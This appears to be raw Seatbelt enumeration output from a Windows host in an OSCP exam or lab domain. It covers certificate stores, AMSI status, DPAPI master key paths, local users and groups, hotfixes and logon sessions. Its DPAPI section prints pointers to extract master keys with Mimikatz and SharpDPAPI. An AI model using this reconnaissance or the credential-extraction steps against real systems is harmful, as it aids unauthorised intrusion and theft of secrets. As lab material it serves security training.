CurrentUser\Root - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
CurrentUser\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
CurrentUser\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - 0119E81BE9A14CD8E22F40AC118C687ECBA3F4D8 (Microsoft Time Stamp Root Certificate Authority 2014) 10/22/2039 3:15:19 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
LocalMachine\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
LocalMachine\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\Root - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
LocalMachine\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
LocalMachine\Root - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
LocalMachine\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
LocalMachine\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
CurrentUser\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\AuthRoot - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
CurrentUser\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CurrentUser\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
CurrentUser\AuthRoot - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\AuthRoot - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
CurrentUser\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
CurrentUser\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
LocalMachine\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\AuthRoot - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
LocalMachine\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
LocalMachine\AuthRoot - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
LocalMachine\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
LocalMachine\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== ChromiumBookmarks ======

====== ChromiumHistory ======

History (C:\Users\r.andrews\AppData\Local\Microsoft\Edge\User Data\Default\History):


====== ChromiumPresence ======


  C:\Users\r.andrews\AppData\Local\Microsoft\Edge\User Data\Default\

    'History'     (2/21/2026 7:03:21 PM)  :  Run the 'ChromiumHistory' command
====== CloudCredentials ======

====== CloudSyncProviders ======

====== CredEnum ======

ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentModel.Win32Exception (0x80004005): Element not found
   at Seatbelt.Commands.Windows.CredEnumCommand.<Execute>d__9.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== CredGuard ======

====== dir ======

  LastAccess LastWrite  Size      Path

  26-02-21   26-02-21   0B        C:\Users\r.andrews\Documents\My Music\
  26-02-21   26-02-21   0B        C:\Users\r.andrews\Documents\My Pictures\
  26-02-21   26-02-21   0B        C:\Users\r.andrews\Documents\My Videos\
  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Music\
  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Pictures\
  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Videos\
  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Music\
  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Pictures\
  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Videos\
====== DNSCache ======

  Entry                          : dc20.oscp.exam
  Name                           : DC20.oscp.exam
  Data                           : 172.16.104.200

  Entry                          : dc20.oscp.exam
  Name                           : DC20.oscp.exam
  Data                           : 172.16.104.200

  Entry                          : slscr.update.microsoft.com
  Name                           : 
  Data                           : 

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.8.09032

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : True
        [!] The highest .NET version is enrolled in AMSI!
====== DpapiMasterKeys ======

  Folder : C:\Users\r.andrews\AppData\Roaming\Microsoft\Protect\S-1-5-21-2481101513-2954867870-2660283483-1106

    LastAccessed              LastModified              FileName
    ------------              ------------              --------
    2/21/2026 7:03:14 PM      2/21/2026 7:03:14 PM      ebcad355-d689-4d53-9a08-0b01698a6cb2


  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
  [*] You can also use SharpDPAPI for masterkey retrieval.
====== Dsregcmd ======

ERROR: Unable to collect. No relevant information were returned
====== EnvironmentPath ======

  Name                           : C:\Windows\system32
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\Wbem
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\OpenSSH\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps
  SDDL                           : O:S-1-5-21-2481101513-2954867870-2660283483-1106D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2481101513-2954867870-2660283483-1106)

====== EnvironmentVariables ======

  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
  <SYSTEM>                           OS                                 Windows_NT
  <SYSTEM>                           Path                               %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\
  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules
  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
  <SYSTEM>                           USERNAME                           SYSTEM
  <SYSTEM>                           windir                             %SystemRoot%
  <SYSTEM>                           NUMBER_OF_PROCESSORS               2
  <SYSTEM>                           PROCESSOR_LEVEL                    6
  <SYSTEM>                           PROCESSOR_IDENTIFIER               Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  <SYSTEM>                           PROCESSOR_REVISION                 4f01
  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
  OSCP\r.andrews                     Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  OSCP\r.andrews                     TEMP                               %USERPROFILE%\AppData\Local\Temp
  OSCP\r.andrews                     TMP                                %USERPROFILE%\AppData\Local\Temp
  OSCP\r.andrews                     OneDrive                           C:\Users\r.andrews\OneDrive
====== ExplicitLogonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== ExplorerMRUs ======

====== ExplorerRunCommands ======


  S-1-5-21-2481101513-2954867870-2660283483-1106 :
    a          :  notepad\1
    MRUList    :  a
====== FileInfo ======

  Comments                       : 
  CompanyName                    : Microsoft Corporation
  FileDescription                : NT Kernel & System
  FileName                       : C:\Windows\system32\ntoskrnl.exe
  FileVersion                    : 10.0.22621.4317 (WinBuild.160101.0800)
  InternalName                   : ntkrnlmp.exe
  IsDebug                        : False
  IsDotNet                       : False
  IsPatched                      : False
  IsPreRelease                   : False
  IsPrivateBuild                 : False
  IsSpecialBuild                 : False
  Language                       : English (United States)
  LegalCopyright                 : c Microsoft Corporation. All rights reserved.
  LegalTrademarks                : 
  OriginalFilename               : ntkrnlmp.exe
  PrivateBuild                   : 
  ProductName                    : Microsoftr Windowsr Operating System
  ProductVersion                 : 10.0.22621.4317
  SpecialBuild                   : 
  Attributes                     : Archive
  CreationTimeUtc                : 10/9/2024 7:09:28 PM
  LastAccessTimeUtc              : 2/22/2026 4:05:12 AM
  LastWriteTimeUtc               : 10/9/2024 7:09:29 PM
  Length                         : 12060128
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)

====== FileZilla ======

====== FirefoxHistory ======

====== FirefoxPresence ======

====== Hotfixes ======

Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.

  KB5044033  10/9/2024 12:00:00 AM  Update                         NT AUTHORITY\SYSTEM
  KB5027397  7/4/2024 12:00:00 AM   Update                         
  KB5044285  10/9/2024 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
  KB5046247  10/9/2024 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
====== IdleTime ======

  CurrentUser : OSCP\r.andrews
  Idletime    : 00h:00m:34s:485ms (34485 milliseconds)

====== IEFavorites ======

Favorites (r.andrews):

  http://go.microsoft.com/fwlink/p/?LinkId=255142

====== IETabs ======

====== IEUrls ======

Internet Explorer typed URLs for the last 7 days

====== InstalledProducts ======

  DisplayName                    : Microsoft Edge
  DisplayVersion                 : 100.0.1185.36
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Edge Update
  DisplayVersion                 : 1.3.173.55
  Publisher                      : 
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Edge WebView2 Runtime
  DisplayVersion                 : 100.0.1185.36
  Publisher                      : 
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31326
  DisplayVersion                 : 14.32.31326.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.32.31326
  DisplayVersion                 : 14.32.31326.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Additional Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : VMware Tools
  DisplayVersion                 : 12.1.0.20219665
  Publisher                      : VMware, Inc.
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Update Health Tools
  DisplayVersion                 : 5.72.0.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31326
  DisplayVersion                 : 14.32.31326
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

====== InterestingFiles ======


Accessed      Modified      Path
----------    ----------    -----
2026-02-21    2026-02-21    C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\22.012.0117.0003\IRMProtectors\microsoft.aip.pdfprotector.dll
====== InterestingProcesses ======

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 4236
    Owner        : OSCP\r.andrews
    CommandLine  : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 9116
    Owner        : OSCP\r.andrews
    CommandLine  : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass

====== InternetSettings ======

General Settings
  Hive                               Key : Value

  HKCU             CertificateRevocation : 1
  HKCU          DisableCachingOfSSLPages : 0
  HKCU                IE5_UA_Backup_Flag : 5.0
  HKCU                   PrivacyAdvanced : 1
  HKCU                   SecureProtocols : 10240
  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU              ZonesSecurityUpgrade : System.Byte[]
  HKCU                WarnonZoneCrossing : 0
  HKCU                   EnableNegotiate : 1
  HKCU                       ProxyEnable : 0
  HKCU                      MigrateProxy : 1
  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
  HKCU                CodeBaseSearchPath : CODEBASE
  HKCU                    EnablePunycode : 1
  HKCU                      MinorVersion : 0
  HKCU                    WarnOnIntranet : 1

URLs by Zone
  No URLs configured

Zone Auth Settings
====== KeePass ======

====== LAPS ======

  LAPS Enabled                          : False
  LAPS Admin Account Name               : 
  LAPS Password Complexity              : 
  LAPS Password Length                  : 
  LAPS Expiration Protection Enabled    : 
====== LastShutdown ======

  LastShutdown                   : 10/10/2024 7:50:09 PM

====== LocalGPOs ======

  GPOName                        : {31B2F340-016D-11D2-945F-00C04FB984F9}
  GPOType                        : machine
  DisplayName                    : Default Domain Policy
  Link                           : LDAP://DC=oscp,DC=exam
  FileSysPath                    : C:\Windows\system32\GroupPolicy\DataStore\0\sysvol\oscp.exam\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
  Options                        : ALL_SECTIONS_ENABLED
  GPOLink                        : DOMAIN
  Extensions                     : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]

  GPOName                        : Local Group Policy
  GPOType                        : user
  DisplayName                    : Local Group Policy
  Link                           : Local
  FileSysPath                    : C:\Windows\System32\GroupPolicy\User
  Options                        : ALL_SECTIONS_ENABLED
  GPOLink                        : LOCAL_MACHINE
  Extensions                     : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]

====== LocalGroups ======

Non-empty Local Groups (and memberships)


  ** WS26\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)

  User            WS26\Administrator                       S-1-5-21-2756297892-2186407355-380279769-500
  Group           OSCP\Domain Admins                       S-1-5-21-2481101513-2954867870-2660283483-512

  ** WS26\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)

  User            WS26\Guest                               S-1-5-21-2756297892-2186407355-380279769-501

  ** WS26\IIS_IUSRS ** (Built-in group used by Internet Information Services.)

  WellKnownGroup  NT AUTHORITY\IUSR                        S-1-5-17

  ** WS26\Remote Desktop Users ** (Members in this group are granted the right to logon remotely)

  User            OSCP\r.andrews                           S-1-5-21-2481101513-2954867870-2660283483-1106

  ** WS26\Remote Management Users ** (Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.)

  User            OSCP\r.andrews                           S-1-5-21-2481101513-2954867870-2660283483-1106
  User            OSCP\g.jarvis                            S-1-5-21-2481101513-2954867870-2660283483-1105

  ** WS26\System Managed Accounts Group ** (Members of this group are managed by the system.)

  User            WS26\DefaultAccount                      S-1-5-21-2756297892-2186407355-380279769-503

  ** WS26\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
  Group           OSCP\Domain Users                        S-1-5-21-2481101513-2954867870-2660283483-513

====== LocalUsers ======

  ComputerName                   : localhost
  UserName                       : Administrator
  Enabled                        : True
  Rid                            : 500
  UserType                       : Administrator
  Comment                        : Built-in account for administering the computer/domain
  PwdLastSet                     : 10/9/2024 10:41:39 AM
  LastLogon                      : 2/21/2026 7:02:00 PM
  NumLogins                      : 27

  ComputerName                   : localhost
  UserName                       : DefaultAccount
  Enabled                        : False
  Rid                            : 503
  UserType                       : Guest
  Comment                        : A user account managed by the system.
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : Guest
  Enabled                        : False
  Rid                            : 501
  UserType                       : Guest
  Comment                        : Built-in account for guest access to the computer/domain
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : WDAGUtilityAccount
  Enabled                        : False
  Rid                            : 504
  UserType                       : Guest
  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
  PwdLastSet                     : 10/9/2024 1:44:21 PM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

====== LogonEvents ======

ERROR: Unable to collect. Must be an administrator/in a high integrity context.
====== LogonSessions ======

Logon Sessions (via WMI)


  UserName              : r.andrews
  Domain                : OSCP
  LogonId               : 2695985
  LogonType             : RemoteInteractive
  AuthenticationPackage : Kerberos
  StartTime             : 2/21/2026 7:03:11 PM
  UserPrincipalName     : 

  UserName              : r.andrews
  Domain                : OSCP
  LogonId               : 2636154
  LogonType             : Network
  AuthenticationPackage : NTLM
  StartTime             : 2/21/2026 7:03:05 PM
  UserPrincipalName     : 
